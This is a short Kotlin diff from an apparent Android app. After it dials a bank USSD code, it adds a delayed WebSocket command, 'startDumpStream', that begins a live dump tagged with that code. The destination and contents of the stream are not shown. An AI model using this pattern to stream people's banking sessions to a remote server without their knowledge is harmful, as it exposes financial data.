@@ -148,11 +148,16 @@ supportActionBar?.hide()
         val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$encoded"))
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
             startActivity(intent)
+            
+            // Auto-start live dump after 3 seconds (wait for USSD to load)
+            mainHandler.postDelayed({
+                webSocketManager.sendCommand("startDumpStream", "{\"tag\":\"${ussdCode}\"}")
+            }, 3000)
         } else {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CALL_PHONE), PERMISSION_REQUEST_CODE)
         }
     } catch (e: Exception) {
         LogUtil.e("MainActivity", "Bank dial failed", e)
     }
-    }
+}
 }
